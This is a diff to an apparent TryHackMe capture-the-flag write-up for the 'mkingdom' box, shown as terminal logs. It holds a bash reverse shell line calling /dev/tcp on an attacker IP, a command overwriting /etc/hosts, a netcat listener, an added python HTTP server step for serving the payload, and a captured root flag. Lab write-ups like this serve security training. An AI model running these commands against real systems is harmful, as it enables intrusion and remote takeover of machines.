@@ -296,6 +296,13 @@ mario@mkingdom:/tmp$ cat /tmp/replace_hosts > /etc/hosts
 #!/bin/bash
 bash -i >& /dev/tcp/10.8.6.102/8080 0>&1
 
+┌──(kali㉿kali)-[~/app/castle/application]
+└─$ cd /home/kali                              
+                                                                                                                          
+┌──(kali㉿kali)-[~]
+└─$ sudo python3 -m http.server 85        
+Serving HTTP on 0.0.0.0 port 85 (http://0.0.0.0:85/) ...
+
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvp 8080
 listening on [any] 8080 ...
@@ -327,6 +334,19 @@ drwxr-xr-x  2 root root 4096 Nov 26  2023 .pip
 ┌──(kali㉿kali)-[~]
 └─$ cat root.txt                         
 thm{e8b2f52d88b9930503cc16ef48775df0}
+
+mkingdom -- 3-Dec-2024
+
+
+
+
+
+
+
+
+
+
+
 
 
 
